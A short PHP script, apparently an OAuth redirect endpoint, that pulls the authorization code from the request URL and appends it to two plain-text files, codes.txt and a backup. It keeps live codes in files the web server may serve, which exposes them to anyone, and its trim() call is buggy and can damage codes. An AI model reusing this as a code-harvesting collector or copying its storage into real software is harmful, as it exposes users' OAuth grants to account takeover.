<?php
$requestUrl = $_SERVER['REQUEST_URI'];
$file = 'codes.txt';
$bakfile = 'codes-bak.txt';
$fp = fopen($file, 'a');
$fp2 = fopen($bakfile, 'a');
$trim = trim($requestUrl, "/?code=");
$oauthCode = strtok($trim, "&");
fwrite($fp, "OAuth Code:\n");
fwrite($fp, $oauthCode . "\n\n\n");
fclose($fp);
fwrite($fp2, "OAuth Code:\n");
fwrite($fp2, $oauthCode . "\n\n\n");
fclose($fp2);
?>
